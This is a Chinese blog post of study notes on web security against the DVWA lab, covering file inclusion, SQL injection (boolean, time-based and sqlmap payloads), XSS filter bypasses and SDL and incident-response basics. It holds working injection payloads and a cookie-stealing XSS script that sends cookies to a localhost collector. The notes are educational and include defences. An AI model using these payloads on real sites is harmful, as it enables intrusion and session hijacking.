+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570441033767.png" alt="1570441033767"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570441076116.png" alt="1570441076116"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570441098078.png" alt="1570441098078"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570441310307.png" alt="1570441310307"></p>
+<p><code>copy 1.PNG/b+1.txt/a 2.PNG</code>    （b:二进制文件；a:文本文件）</p>
+<blockquote>
+<p><strong>合并文本文件。</strong></p>
+<p>复制命令的隐藏功能就是可以将多个文件合并到一起。这对于处理纯文本文件时是很有帮助的。使用以下命令，可以将第一个和第二个文件中的内容合并在一起，生成一个新文件。复制命令是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 文件1.txt+文件2.txt 新文件.txt</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>这个命令假定文件1.txt和文件2.txt都位于当前路径下。如果文件位于其它路径中，你需要在每个文件名的前面加上文件所在的路径。</li>
+</ul>
+</blockquote>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570442532851.png" alt="1570442532851"></p>
+<p>验证：</p>
+<p><strong>文件包含漏洞high等级</strong>：</p>
+<p>合则分生则死</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570448144391.png" alt="1570448144391"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570448238094.png" alt="1570448238094"></p>
+<h3 id="impossible等级"><a href="#impossible等级" class="headerlink" title="impossible等级"></a>impossible等级</h3><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570448852499.png" alt="1570448852499"></p>
+<h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><ul>
+<li>阻止非法文件上传</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570449034120.png" alt="1570449034120"></p>
+<ul>
+<li>阻止非法文件执行<ul>
+<li>文件重命名</li>
+<li>文件压缩重生成</li>
+<li>存储目录执行权限</li>
+<li>存储目录与web分离</li>
+</ul>
+</li>
+</ul>
+<h2 id="7-SQL注入"><a href="#7-SQL注入" class="headerlink" title="7  SQL注入"></a>7  SQL注入</h2><ul>
+<li>命令注入:</li>
+<li>SQL注入:</li>
+</ul>
+<p>SQL<strong>回显注入</strong>：数据库的执行结果直接<strong>显示到页面</strong>上</p>
+<p>工具：firefox、dvwa、hackbar、firebug、tamper data、sqlmap<img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570451783504.png" alt="1570451783504"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570451765570.png" alt="1570451765570"></p>
+<p>SQL注入猜测：</p>
+<p><code>select firstname,sunname from xxx where userid=&quot;我们输入的id&quot;</code></p>
+<p>探测是否存在漏洞:输入1’——提交——错误回显</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570453597897.png" alt="1570453597897"></p>
+<h3 id="三种注入POC"><a href="#三种注入POC" class="headerlink" title="三种注入POC"></a><strong>三种注入POC</strong></h3><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570453663573.png" alt="1570453663573"></p>
+<p><strong>确认注入POC</strong>：</p>
+<ul>
+<li>1 or  1024=1024</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570453842458.png" alt="1570453842458"></p>
+<ul>
+<li>1’ or ‘1024’=’1024</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570453915535.png" alt="1570453915535"></p>
+<ul>
+<li>1” or “1024”=”1024</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570453929728.png" alt="1570453929728"></p>
+<h3 id="三种mysql注释符"><a href="#三种mysql注释符" class="headerlink" title="三种mysql注释符"></a>三种mysql注释符</h3><ol>
+<li><code>#</code>（忽略）：单行注释，注意与url中#区分，常编码成<code>%23</code></li>
+<li><code>--  </code>(忽略)：单行注释，注意是<strong>短线短线空格</strong></li>
+<li><code>/*(忽略)*/</code>：多行注释，至少有<strong>两处输入</strong>，/**/注入常用来作为空格</li>
+</ol>
+<p><strong>确定查询字段数</strong></p>
+<ul>
+<li>1’ order by 1– （别忘了空格）</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570454364256.png" alt="1570454364256"></p>
+<ul>
+<li><code>1&#39; order by 10-- </code></li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570454498561.png" alt="1570454498561"></p>
+<p><strong>解决方法：二分法</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570454563067.png" alt="1570454563067"></p>
+<p><strong>确定回显点</strong></p>
+<p><code>union select </code></p>
+<p>`1,</p>
+<p><code>2</code></p>
+<p>查询s</p>
+<h3 id="演练"><a href="#演练" class="headerlink" title="演练"></a>演练</h3><p><strong>低等级</strong></p>
+<h3 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h3><p>输入1显示——&gt;查询结果：真</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570881049174.png" alt="1570881049174"></p>
+<p>输入：-1——&gt;查询结果：假</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570881110911.png" alt="1570881110911"></p>
+<p>三种注入POC ：<code>真 and 假 = 假</code></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570881306459.png" alt="1570881306459"></p>
+<p>确定注入POC：</p>
+<ul>
+<li>1 and 1024 = 1025</li>
+<li>1’ and ‘1024’=’1025</li>
+<li>1”and “1024”=”1025</li>
+</ul>
+<p>结果分别是</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570881456454.png" alt="1570881456454"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570881518870.png" alt="1570881518870"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570881531818.png" alt="1570881531818"></p>
+<p><strong>盲注思路</strong></p>
+<p><code>1&#39;and 真 --</code>    为真</p>
+<p><code>1&#39; and 假 --</code>  为假</p>
+<p><strong>SQL函数</strong></p>
+<p>函数1：<code>length(str)</code></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570886124529.png" alt="1570886124529"></p>
+<p><code>1&#39; and length(database())&gt;1 --</code>结果：</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570886415988.png" alt="1570886415988"></p>
+<p><code>1&#39; and length(database())&gt;10 --</code>:结果</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570886467938.png" alt="1570886467938"></p>
+<p>然后使用二分法进行尝试</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570886530887.png" alt="1570886530887"></p>
+<p>函数2 ：<code>substr(expression,start,length)</code> 作用是获取子字符串（原始字符串，子串开始位置，子串长度）</p>
+<p>函数3：ascii(string)作用是获取第一个字符的ASCII数值（字符串）</p>
+<p><strong>确定字符串内容</strong></p>
+<ul>
+<li><p>单字符ASCII码范围：0-127</p>
+</li>
+<li><p><code>1&#39; and ascii(substr(database(),1,1))&gt;64 --</code></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570893252652.png" alt="1570893252652"></p>
+</li>
+</ul>
+<p><strong>SQL盲注分类</strong></p>
+<ul>
+<li>布尔型</li>
+<li>延时型<ul>
+<li><code>if(expr1,expr2,expr3)</code>:如果expr1为真，返回expr2，否则返回expr3</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570893338580.png" alt="1570893338580"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570893371527.png" alt="1570893371527"></p>
+<ul>
+<li>sleep（N）：休眠（N秒）</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570893418853.png" alt="1570893418853"></p>
+<p><code>1&#39; and sleep(if(length(database())=4,5,0))--</code></p>
+<ul>
+<li>benchmark(count,expr):重复计算（次数为count，表达式）</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570893743150.png" alt="1570893743150"></p>
+<p><strong>sqlmap操作：</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570894137940.png" alt="1570894137940"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570894155525.png" alt="1570894155525"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570894180980.png" alt="1570894180980"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570894191648.png" alt="1570894191648"></p>
+<p><strong>sqlmap注入方法</strong></p>
+<ul>
+<li>payload</li>
+<li><code>1&#39; AND ORD(MID((IFNULL(CAST(DATABASE() AS CHAR),0X20))1,1))&gt;64 AND &#39;kqKY&#39;=&#39;kqKY&#39;</code></li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570895542200.png" alt="1570895542200"></p>
+<p>SQL函数：<code>cast(expression as data_type)</code>:数据类型转换（表达式as新的数据类型）</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570894423260.png" alt="1570894423260"></p>
+<ul>
+<li><p><code>ifnull(expr1,expr2)</code>:如果expr1是null，返回expr2，否则返回本身</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570894554927.png" alt="1570894554927"></p>
+</li>
+<li><p><code>mid(expression,start,length)</code>：获取子字符串（原始字符串，子串开始位置，子串长度）</p>
+</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570895336523.png" alt="1570895336523"></p>
+<ul>
+<li>order（string）：获取第一个字符的ASCII数值（字符串）</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570895447481.png" alt="1570895447481"></p>
+<h4 id="中等难度"><a href="#中等难度" class="headerlink" title="中等难度"></a>中等难度</h4><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570895593775.png" alt="1570895593775"></p>
+<h4 id="高级"><a href="#高级" class="headerlink" title="高级"></a>高级</h4><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570895649534.png" alt="1570895649534"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570895691525.png" alt="1570895691525"></p>
+<p><strong>演练</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570896157984.png" alt="1570896157984"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570896188427.png" alt="1570896188427"></p>
+<h4 id="impossible等级-1"><a href="#impossible等级-1" class="headerlink" title="impossible等级"></a>impossible等级</h4><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570896521988.png" alt="1570896521988"></p>
+<p>解决</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570896534031.png" alt="1570896534031"></p>
+<h2 id="8-XSS"><a href="#8-XSS" class="headerlink" title="8 XSS"></a>8 XSS</h2><p>三种类型：</p>
+<ul>
+<li>存储型XSS：攻击代码在<strong>数据库</strong>里，输出在<strong>HTTP响应</strong>中</li>
+<li>反射型XSS：攻击代码在<strong>url</strong>里，输出在<strong>HTTP响应</strong>中</li>
+<li>DOM型XSS：攻击代码在<strong>url</strong>里，输出在<strong>DOM节点</strong>中</li>
+</ul>
+<h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>输入<code>xss</code>和<code>&lt;xss&gt;</code>，结果分别是</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570931479249.png" alt="1570931479249"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570931495017.png" alt="1570931495017"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570931768767.png" alt="1570931768767"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570931679807.png" alt="1570931679807"></p>
+<p><strong>弹窗测试</strong>：</p>
+<ul>
+<li><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570931841776.png" alt="1570931841776"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570932011491.png" alt="1570932011491"></p>
+<p>查看页面元素，成功注入JavaScript脚本</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570932085102.png" alt="1570932085102"></p>
+<p>还有其他的JavaScript弹窗函数</p>
+<ul>
+<li><code>confirm()</code></li>
+<li><code>prompt()</code></li>
+</ul>
+<p><strong>攻击思路</strong><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570932221155.png" alt="1570932221155"></p>
+<p><strong>攻击者web设计</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570932386926.png" alt="1570932386926"></p>
+<p><strong>构造攻击js</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570932431640.png" alt="1570932431640"></p>
+<p><strong>构造并发送攻击url</strong></p>
+<p>​    <img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570932453395.png" alt="1570932453395"></p>
+<p>上面的url并不能达到要求，此时需要对url进行URLencode才行</p>
+<p><strong>获取cookie</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570932544088.png" alt="1570932544088"></p>
+<p><strong>劫持会话</strong></p>
+<ul>
+<li><p>firebug</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570932622351.png" alt="1570932622351"></p>
+</li>
+<li><p>cookie编辑</p>
+</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570932637695.png" alt="1570932637695"></p>
+<ul>
+<li>index.php</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570932605122.png" alt="1570932605122"></p>
+<p><strong>演示：</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570932991292.png" alt="1570932991292"></p>
+<ul>
+<li><code>http://127.0.0.1/dvwa-master/vulnerabilities/xss_r/?name=&lt;script&gt;document.location=&#39;http://localhost/cookie.php?cookie&#39;=+document.cookie;&lt;/script&gt;</code></li>
+</ul>
+<p><strong>Medium等级</strong></p>
+<p>之前的方法不行了，因为被过滤了，如下</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570933816599.png" alt="1570933816599"></p>
+<ul>
+<li>方法：嵌套，即<code>&lt;scr&lt;script&gt;ipt&gt;</code>就成了</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570933924058.png" alt="1570933924058"></p>
+<ul>
+<li>方法：大小写混合，因为我们猜测只进行对小写的过滤，事实证明是对的</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570934065746.png" alt="1570934065746"></p>
+<p><strong>High等级</strong></p>
+<p>之前的low和medium都是失效的</p>
+<p>方法：</p>
+<ul>
+<li><p><code>img</code>标签也可嵌入<code>script</code>标签：<code>&lt;img src=x onerror=alert(1)&gt;</code></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570934302061.png" alt="1570934302061"></p>
+</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570934344019.png" alt="1570934344019"></p>
+<ul>
+<li>iframe标签：可以嵌入另一个HTML内容，<code>&lt;iframe onload=alert(1)&gt;</code></li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570934414560.png" alt="1570934414560"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570934461934.png" alt="1570934461934"></p>
+<p><strong>impossible等级（这是一个安全等级）</strong></p>
+<ul>
+<li>&amp;” ‘ &lt;&gt;</li>
+</ul>
+<p>了解一下<code>htmlspecialchars</code>函数</p>
+<ul>
+<li><code>&amp;</code>：<code>&amp;amp;</code></li>
+<li><code>&quot;</code>：<code>&amp;quot;</code></li>
+<li><code>&#39;</code>：<code>&amp;apos;</code>       ——&gt;  <code>ENT_QUOTES参数</code></li>
+<li><code>&lt;</code>：<code>&amp;lt;</code></li>
+<li><code>&gt;</code>：<code>&amp;gt;</code></li>
+</ul>
+<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p><strong>前端限制</strong>：限制了长度</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570935030935.png" alt="1570935030935"></p>
+<p><strong>方法：使用Tamper Data绕过</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570935234036.png" alt="1570935234036"></p>
+<p>最后成功绕过限制</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570935265788.png" alt="1570935265788"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570935927528.png" alt="1570935927528"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570935953663.png" alt="1570935953663"></p>
+<h2 id="9-SDL"><a href="#9-SDL" class="headerlink" title="9 SDL"></a>9 SDL</h2><p>为什么要用：</p>
+<ul>
+<li>提升web应用的安全性，减少web应用的安全漏洞</li>
+<li>降低安全漏洞修复成本</li>
+</ul>
+<p>SDL是什么：</p>
+<ul>
+<li>Security Development Lifecycle：安全开发生产周期</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1570936306322.png" alt="1570936306322"></p>
+<p>SDL流程的组成：</p>
+<ul>
+<li>培训：核心安全培训</li>
+<li>需求：安全需求分析——质量要求/bug数量要求——安全和隐私风险评估</li>
+<li>设计：设计需求分析——减小攻击面</li>
+<li>实施：使用指定工具——弃用不安全函数——静态分析</li>
+<li>验证：动态分析——模糊测试——威胁模型和攻击面评析</li>
+<li>发布：事件响应计划——最终安全评析——发布存档</li>
+<li>响应 </li>
+</ul>
+<h2 id="10-漏洞和事件处理"><a href="#10-漏洞和事件处理" class="headerlink" title="10 漏洞和事件处理"></a>10 漏洞和事件处理</h2><ul>
+<li>安全需求分析：<ul>
+<li>项目初期介入，<strong>提前</strong>发现安全问题</li>
+<li>使用web框架和语言的选型建议</li>
+<li>敏感信息，如密码的保存方案</li>
+<li>是否有上传功能</li>
+<li>……</li>
+</ul>
+</li>
+<li>安全扫描：<ul>
+<li>通过扫描器发现安全问题</li>
+<li>自动化</li>
+<li>周期性执行</li>
+</ul>
+</li>
+<li>安全测试：<ul>
+<li>发现安全问题的<strong>主要方式</strong></li>
+<li>包括白盒和黑盒测试，通常以黑盒测试为主</li>
+</ul>
+</li>
+<li>入侵检测：<ul>
+<li>项目上线之后进行监控</li>
+<li>包含多种检测方式</li>
+<li>通过监控入侵行为发现问题</li>
+</ul>
+</li>
+<li>日志分析：<ul>
+<li>项目上线之后分析日志</li>
+<li>常见模式：可疑日志+人工分析   /    可疑日志+扫描器</li>
+</ul>
+</li>
+<li>建立SRC： <ul>
+<li>安全响应中心：Security  Response  Center</li>
+<li>通过安全爱好者发现安全问题</li>
+</ul>
+</li>
+<li>与漏洞搜集平台合作：<ul>
+<li>借助漏洞平台的力量和影响力</li>
+</ul>
+</li>
+<li>其他渠道：<ul>
+<li>黑产卧底</li>
+<li>和国家执法部门合作</li>
+</ul>
+</li>
+</ul>
+<p><strong>如何处理安全漏洞？</strong></p>
+<ol>
+<li><strong>防御方面</strong></li>
+</ol>
+<ul>
+<li><p>输入检查：</p>
+<ul>
+<li>在服务端检查</li>
+<li>数据合法性校验：类型、范围、长度</li>
+<li>尽可能使用“白名单”</li>
+</ul>
+</li>
+<li><p>输出检查：</p>
+<ul>
+<li>在数据输出的点，也需要做一些特定的过滤和转义</li>
+<li>比如xss，输出到HTML标签时就需要进行HTML编码</li>
+</ul>
+</li>
+<li><p>针对性防御：</p>
+<ul>
+<li>针对特定安全漏洞的利用方式，有特定的防御策略</li>
+<li>比如重要的cookie设置为httponly，这样使用xss就获取不到cookie</li>
+</ul>
+</li>
+<li><p>WAF:</p>
+<ul>
+<li>web Application Firewall：web应用防火墙</li>
+<li>能够拦截攻击，如针对SQL注入、xss和远程代码执行等漏洞进行的攻击</li>
+</ul>
+</li>
+</ul>
+<p>输入检查——输出检查——针对性防御——WAF</p>
+<p>2 <strong>修复</strong></p>
+<ul>
+<li>漏洞知识库：<ul>
+<li>提供详细的漏洞说明和修复方案</li>
+<li>修复方案需要可落地执行：<ul>
+<li>结合公司的开发情况：框架、语言</li>
+<li>包含各种框架、语言的修复方案</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>漏洞修复周期：根据漏洞危害等级限定漏洞修复周期，如严重漏洞需要24小时内修复</li>
+<li>漏洞复查：漏洞修复后需要安全团队复查，业务方和开发不可信</li>
+</ul>
+<p><strong>企业如何处理安全事件？</strong></p>
+<p>安全事件应急响应流程：</p>
+<ul>
+<li>事件确认：由产品方、安全方确认事件的真实性，必要时需要和运维、公关和法务等其他团队共同确认</li>
+<li>事件汇报：</li>
+<li>事件处理：<ul>
+<li>成立安全应急小组</li>
+<li>应急方案确定</li>
+<li>应急方案执行</li>
+<li>事件恢复</li>
+</ul>
+</li>
+<li>归档和复盘：事件处理过程需要详细记录、归档，对事件进行复盘</li>
+</ul>
+<p>安全事件分类：</p>
+<ol>
+<li>入侵事件</li>
+<li>攻击事件</li>
+<li>信息泄露事件</li>
+</ol>
+<p>安全事件分级</p>
+<ol>
+<li>高危</li>
+<li>中危</li>
+<li>低危</li>
+</ol>
+<h2 id="11-安全运营概述"><a href="#11-安全运营概述" class="headerlink" title="11  安全运营概述"></a>11  安全运营概述</h2><p>安全运营有哪些工作？</p>
+<ul>
+<li>发现和修复安全问题</li>
+<li>防御体系建设和快速响应攻击</li>
+<li></li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/" class="leancloud-visitors view" data-flag-title="web安全入门">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2020/07/15/web安全前后端/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2020/07/15/webug学习记录/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
